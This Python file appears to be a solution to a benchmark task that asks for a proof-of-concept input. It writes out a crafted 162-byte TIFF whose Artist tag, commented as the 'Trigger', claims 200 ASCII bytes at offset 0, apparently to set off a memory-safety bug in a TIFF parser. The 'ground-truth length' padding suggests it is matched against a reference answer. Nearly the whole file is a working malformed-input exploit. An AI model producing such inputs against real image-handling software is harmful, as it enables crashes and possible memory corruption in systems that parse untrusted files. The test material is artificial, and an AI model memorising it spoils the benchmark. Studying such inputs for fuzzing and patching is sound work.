import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        le16 = lambda x: struct.pack("<H", x & 0xFFFF)
        le32 = lambda x: struct.pack("<I", x & 0xFFFFFFFF)

        # TIFF header (little-endian): 'II' 42, first IFD at offset 8
        out = bytearray()
        out += b"II"
        out += le16(42)
        out += le32(8)

        # IFD with 10 entries
        num_entries = 10
        ifd_start = 8
        ifd_size = 2 + num_entries * 12 + 4
        pixel_offset = ifd_start + ifd_size

        def ifd_entry(tag, typ, count, value_or_offset):
            return le16(tag) + le16(typ) + le32(count) + le32(value_or_offset)

        # Types: 1=BYTE, 2=ASCII, 3=SHORT, 4=LONG
        entries = []
        entries.append(ifd_entry(256, 4, 1, 1))                 # ImageWidth
        entries.append(ifd_entry(257, 4, 1, 1))                 # ImageLength
        entries.append(ifd_entry(258, 3, 1, 8))                 # BitsPerSample = 8
        entries.append(ifd_entry(259, 3, 1, 1))                 # Compression = none
        entries.append(ifd_entry(262, 3, 1, 1))                 # Photometric = BlackIsZero
        entries.append(ifd_entry(273, 4, 1, pixel_offset))      # StripOffsets -> pixel data
        entries.append(ifd_entry(277, 3, 1, 1))                 # SamplesPerPixel = 1
        entries.append(ifd_entry(278, 4, 1, 1))                 # RowsPerStrip = 1
        entries.append(ifd_entry(279, 4, 1, 1))                 # StripByteCounts = 1

        # Trigger: offline (out-of-line) tag with value offset 0 and large count
        # Artist (315), ASCII, count 200, offset 0
        entries.append(ifd_entry(315, 2, 200, 0))

        out += le16(num_entries)
        for e in entries:
            out += e
        out += le32(0)  # next IFD offset

        # Pixel data at pixel_offset: 1 byte
        if len(out) < pixel_offset:
            out += b"\x00" * (pixel_offset - len(out))
        out += b"\x00"

        # Pad to 162 bytes (ground-truth length)
        target_len = 162
        if len(out) < target_len:
            out += b"\x00" * (target_len - len(out))
        else:
            out = out[:target_len]

        return bytes(out)